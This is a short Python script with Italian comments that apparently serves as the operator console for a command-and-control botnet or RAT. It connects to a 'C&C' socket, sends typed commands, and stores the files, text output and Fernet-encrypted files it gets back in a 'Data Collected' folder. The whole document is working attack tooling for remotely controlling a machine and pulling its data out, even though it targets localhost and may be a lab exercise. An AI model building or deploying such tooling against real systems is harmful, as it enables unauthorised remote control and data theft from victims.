import socket
import os
from cryptography.fernet import Fernet

# Crea una cartella per salvare i file se non esiste
folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "Data Collected")
os.makedirs(folder_path, exist_ok=True)
output_file = os.path.join(folder_path, "output.txt")

# Si connette al C&C 
HOST_CNC = 'localhost'
PORT_CNC = 6000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST_CNC, PORT_CNC))

while True:
    # Invia il comando
    command = input("Write a command: ")
    s.send(command.encode())
    if command.strip().upper() == "STOP":
        break

    # Riceve la chiave e l'output
    sym_key = None
    cmd = command.split()[0].upper()
    if cmd == "CIFRA":
        syn_ack  = s.recv(1024)
        sym_key = s.recv(4096)
        print("Symmetric key received.")
    output = s.recv(4096)

    # Controlla se è un file
    if output.startswith(b"FILENAME:"):
        header, file_data = output.split(b"\n", 1)
        file_name = header.decode().split(":", 1)[1].strip()
        filepath = os.path.join(folder_path, file_name)
        print(f"File received: {file_name}, saved in {filepath}")

        # Scrive il file in modalità binaria
        with open(filepath, "wb") as f:
            f.write(file_data)
            
    # Controlla se è un file cifrato
    elif output.startswith(b"enc_"):
        header_enc, data_to_decrypt = output.split(b"\n", 1)
        new_header = header_enc.decode()
        file_name = new_header.strip()
        filepath = os.path.join(folder_path, file_name)

        if sym_key is not None:
            fernet = Fernet(sym_key)
            decrypted = fernet.decrypt(data_to_decrypt)
            with open(filepath, "wb") as f:
                f.write(decrypted)
                print(f"[DECRYPTED FILE] File saved as: {filepath}")
        else:
            print("[ERROR] Key has not been received.")
    
    else:
        text = output.decode(errors="replace")
        print(text)
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(text)
        print("Textual output saved.")

s.close()
